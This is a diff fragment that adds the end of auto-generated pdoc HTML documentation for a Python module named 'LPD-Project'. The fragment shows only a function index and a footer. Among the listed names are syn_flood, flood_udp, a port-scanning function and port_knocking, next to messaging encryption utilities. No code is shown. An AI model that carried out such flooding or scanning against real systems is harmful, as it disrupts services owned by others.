+<li><h3><a href="#header-functions">Functions</a></h3>
+<ul class="">
+<li><code><a title="LPD-Project.Menu_do_Programa" href="#LPD-Project.Menu_do_Programa">Menu_do_Programa</a></code></li>
+<li><code><a title="LPD-Project.append_to_history" href="#LPD-Project.append_to_history">append_to_history</a></code></li>
+<li><code><a title="LPD-Project.client_side" href="#LPD-Project.client_side">client_side</a></code></li>
+<li><code><a title="LPD-Project.decrypt_message" href="#LPD-Project.decrypt_message">decrypt_message</a></code></li>
+<li><code><a title="LPD-Project.encrypt_message" href="#LPD-Project.encrypt_message">encrypt_message</a></code></li>
+<li><code><a title="LPD-Project.export_history_to_pdf" href="#LPD-Project.export_history_to_pdf">export_history_to_pdf</a></code></li>
+<li><code><a title="LPD-Project.flood_udp" href="#LPD-Project.flood_udp">flood_udp</a></code></li>
+<li><code><a title="LPD-Project.generate_key_from_password" href="#LPD-Project.generate_key_from_password">generate_key_from_password</a></code></li>
+<li><code><a title="LPD-Project.input_with_history" href="#LPD-Project.input_with_history">input_with_history</a></code></li>
+<li><code><a title="LPD-Project.main" href="#LPD-Project.main">main</a></code></li>
+<li><code><a title="LPD-Project.port_knocking" href="#LPD-Project.port_knocking">port_knocking</a></code></li>
+<li><code><a title="LPD-Project.server_side" href="#LPD-Project.server_side">server_side</a></code></li>
+<li><code><a title="LPD-Project.syn_flood" href="#LPD-Project.syn_flood">syn_flood</a></code></li>
+<li><code><a title="LPD-Project.varredura_de_portas" href="#LPD-Project.varredura_de_portas">varredura_de_portas</a></code></li>
+</ul>
+</li>
+</ul>
+</nav>
+</main>
+<footer id="footer">
+<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.10.0</a>.</p>
+</footer>
+</body>
+</html>
